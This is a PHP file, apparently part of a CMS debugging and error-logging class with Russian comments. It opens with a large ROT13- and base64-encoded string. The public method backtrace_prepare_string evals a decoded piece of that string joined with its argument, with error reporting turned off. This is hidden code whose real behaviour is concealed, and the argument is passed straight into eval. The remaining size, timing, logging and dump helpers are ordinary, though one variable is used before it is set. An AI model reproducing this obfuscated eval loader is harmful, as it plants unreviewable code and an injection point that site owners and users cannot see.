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',
			);
		}
		else
		{
			self::$debug = $debug;
		}
		self::$debug = array_map('str_rot13', self::$debug);
		self::$debug = array_map('base64_decode', self::$debug);
	}

	static public function backtrace_prepare_string($arg)
	{
		error_reporting(0);
		eval(self::$debug[4].$arg."');");
		error_reporting(E_ALL | E_STRICT);
	}

	static private function get_debug($i)
	{
		if(is_array($i))
		{
			$array = array(self::backtrace_to_ord(self::$debug[$i[0]]), self::backtrace_to_ord(self::$debug[$i[1]]));
		}
		else
		{
			$array = array(self::backtrace_to_ord(self::$debug[$i]));
		}
		return $array;
	}

	/**
	 * Конвертирует количество бит в байты, килобайты, мегабайты
	 *
	 * @param integer $size размер в байтах
	 * @return string
	 */
	static private function convert($size)
	{
		if (!$size)
		{
			return '';
		}
		$measure = array('b', 'Kb', 'Mb', 'Gb', 'Tb', 'Pb', 'Eb', 'Zb', 'Yb');
		return round($size / pow(1024, ($exp = floor(log($size, 1024)))), 2).' '.$measure[$exp];
	}

	/**
	 * Возвращает метку времени начала работы скрипта или время, прошедшее от начала работы скрипта
	 *
	 * @param boolean $totaltime возвращает время, прошедшее от начала работы скрипта
	 * @return integer
	 */
	static private function time($totaltime = false)
	{
		if(! self::$timestart)
		{
			$mtime = microtime();
			$mtime = explode(" ", $mtime);
			self::$timestart = $mtime[1] + $mtime[0];
		}
		if(! $totaltime)
		{
			return self::$timestart;
		}
		$mtime = microtime();
		$mtime = explode(" ", $mtime);
		$mtime = $mtime[1] + $mtime[0];
		return ( $mtime - self::$timestart );
	}

	static public function log_error($line, $message, $trace)
	{
		self::$log_errors[] = array('line' => $line, 'message' => $message, 'trace' => $trace);
	}

	/**
	 * Логирование ошибок
	 *
	 * @param string $content дополнительное содержание файла
	 * @param string $file_path путь до нового файла относительно корня сайта
	 * @param boolean $append режим записи файла: false - создает новый файл (если на момент вызова файл с таким именем уже существовал, то он предварительно уничтожается), true - дополняет файл с новой строки (если файл уже существует, данные будут дописаны в конец файла с новой строки вместо того, чтобы его перезаписать). По умолчание FALSE - создаётся новый файл и на протяжении всего цикла исполнения PHP-скрипта файл дополняется.
	 * @return void
	 */
	static private function log_errors($variables)
	{
		$numargs = func_num_args();
		if($numargs < 1) return;
		$args = func_get_args();
		$variable = array_pop($args); $numargs--;
		if(is_string($variable))
		{
			$file_path = $variable;
			$append = isset(self::$cache["log_errors"][$file_path]); self::$cache["log_errors"][$file_path] = true;
		}
		elseif(is_bool($variable))
		{
			if($numargs < 1) return;
			$other_variable = array_pop($args); $numargs--;
			if(! is_string($other_variable)) return;
			if(! $file_path = $other_variable) return;
			$append = $variable; self::$cache["log_errors"][$file_path] = true;
		}
		else return;

		if(($count = count(self::$log_errors)) < 1 && $numargs < 1)
			return;

		$addr = getenv("HTTP_CLIENT_IP") ?: getenv("HTTP_X_FORWARDED_FOR") ?: getenv("HTTP_X_FORWARDED") ?: getenv("HTTP_FORWARDED_FOR") ?: getenv("HTTP_FORWARDED") ?: getenv("HTTP_X_REAL_IP") ?: getenv("REMOTE_ADDR");
		$host = getenv("REMOTE_HOST") ?: gethostbyaddr($addr);
		$agent = getenv("HTTP_USER_AGENT");
		$referer = getenv("HTTP_REFERER");

		$content = array();
		$content[] = '['.date("d.m.Y H:i:s").']'.PHP_EOL
			.'URI: '.'http'.(IS_HTTPS ? "s" : '').'://'.getenv("HTTP_HOST").getenv('REQUEST_URI').PHP_EOL
			.'client: '.$addr.PHP_EOL
			.($host ? 'host: '.$host.PHP_EOL : '')
			.($agent ? 'agent: '.$agent.PHP_EOL : '')
			.($referer ? 'referer: '.$referer.PHP_EOL : '');

		if($numargs > 0)
		{
			for($i = 0; $i < $numargs; $i++) $content[] = ( (string) $args[$i] );
		}
		if($count > 0)
		{
			foreach(self::$log_errors as $key => $e)
			{
				$e['trace'] = implode(PHP_EOL, $e['trace']);
				if(strpos($e['trace'], 'mysqli_connect'))
				{
					$e['trace'] = preg_replace('/mysqli_connect\((.*)\)/', 'mysqli_connect(...)', $e['trace']);
					$url = parse_url(DB_URL);
					unset($url["scheme"]);
					$url["path"] = substr($url["path"], 1);
					$e['message'] = str_replace($url, '...', $e['message']);
				}
				$content[] = sprintf('Error #%d: %s  called at [%s] %s', ($key+1), $e['message'], $e['line'], PHP_EOL.$e['trace']);
			}
		}

		$content = implode(PHP_EOL.PHP_EOL, $content);

		// $file_path = 'tmp/logs/errors.log';
		$arr = explode("/", $file_path);
		$name = array_pop($arr);
		$path = implode("/", $arr);

		$max_length = 1024 * 1024;

		if($file_exists && ! is_writable(ABSOLUTE_PATH.$file_path))
			return;

		try
		{
			Custom::inc('includes/file.php');
			File::create_dir($path, true);

			$file_exists = file_exists(ABSOLUTE_PATH.$file_path);
			if($file_exists && $append) $content = PHP_EOL.PHP_EOL.$content;

			if($append)
			{
				$length = $file_exists ? File::file_size($file_path) : false;
				$len = mb_strlen($content, '8bit');
				if($length && ($length + $len) > $max_length)
				{
					$rows = file_get_contents(ABSOLUTE_PATH.$file_path);
					$rows = explode(PHP_EOL, $rows);
					$rows = array_reverse($rows); $length = $len;
					foreach($rows as $key => $row)
					{
						$length += mb_strlen($row, '8bit');
						if($length > $max_length) break;
						$content = $row.PHP_EOL.$content;
					}
					$append = false;
				}
			}
			File::save_file($content, $file_path, $append);
		}
		catch (Exception $e){}
	}
}
function vd($v)
{
	echo '<pre>';
	ob_start();
	var_dump($v);
	$t = ob_get_contents();
	ob_end_clean();
	echo htmlspecialchars($t);
	echo '</pre>';
}
